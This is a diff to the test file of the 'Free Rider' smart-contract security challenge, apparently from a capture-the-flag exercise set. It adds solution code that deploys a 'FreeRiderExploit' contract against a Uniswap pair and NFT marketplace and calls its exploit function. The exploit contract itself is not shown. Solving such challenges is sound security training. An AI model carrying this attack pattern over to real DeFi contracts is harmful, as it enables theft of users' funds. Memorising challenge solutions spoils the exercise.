@@ -106,11 +106,14 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("dev contract address: ", devsContract.address);
+        const Contract = await ethers.getContractFactory('FreeRiderExploit', player);
+        const contract = await Contract.deploy(uniswapPair.address, marketplace.address, weth.address, devsContract.address);
+        console.log(await contract.exploit(NFT_PRICE));
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-
         // The devs extract all NFTs from its associated contract
         for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
             await nft.connect(devs).transferFrom(devsContract.address, devs.address, tokenId);
